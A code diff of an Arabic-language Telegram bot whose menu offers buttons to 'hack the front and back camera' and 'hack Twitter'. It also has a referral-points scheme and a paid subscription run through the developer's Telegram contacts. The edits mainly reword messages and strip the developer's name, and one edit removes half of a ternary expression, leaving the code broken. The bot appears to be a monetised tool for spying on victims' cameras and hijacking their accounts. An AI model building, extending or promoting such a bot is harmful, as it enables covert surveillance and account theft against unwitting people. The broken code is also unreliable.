@@ -667,7 +667,7 @@ function checkPointsAndSubscribe(userId) {
     const points = userPoints.get(userId) || 0;
     if (points >= pointsRequiredForSubscription && !subscribedUsers.has(userId)) {
         subscribedUsers.add(userId);
-        bot.sendMessage(userId, 'مبروك! لقد جمعت 15 نقطة. تم اشتراكك في البوت وتستطيع الآن استخدام البوت بدون قيود.');
+        bot.sendMessage(userId, 'مبروك! لقد جمعت نقاط.كافيه تم اشتراكك في البوت وتستطيع الآن استخدام البوت بدون قيود.');
     }
 }
 
@@ -701,7 +701,7 @@ async function showButtons(chatId, userId) {
 
   let statusMessage = isSubscribed 
     ? 'أنت مشترك في البوت ويمكنك استخدامه بدون قيود.'
-     'اجمع 15 نقطة للاشتراك في البوت واستخدامه بدون قيود.`
+     
 
    let keyboard = [
         [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data:'front_camera' }],
@@ -716,8 +716,8 @@ async function showButtons(chatId, userId) {
         [{ text: '🐦اختراق تويتر🐦', callback_data:'increase_twitter' }],
         [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_data:'create_referral' }],
         [{ text: '💰 نقاطي 💰', callback_data: 'my_points' }],
-        [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
-        [{ text: 'سجاد تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
+        [{ text: 'قناة المطور ', url: 'https://t.me/SJGDDW' }],
+        [{ text: ' تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
     ];
 
     bot.sendMessage(chatId, `${statusMessage}\n\nمرحبا قوم بختيار اي  شي تريده لكن لان تستطيع استخدام اي رابط سوى 5مرات حتى تقوم بدفع اشتراك من المطور @SAGD112 او قوم بتجميع نقاط لاستخدامه مجانآ:`, {
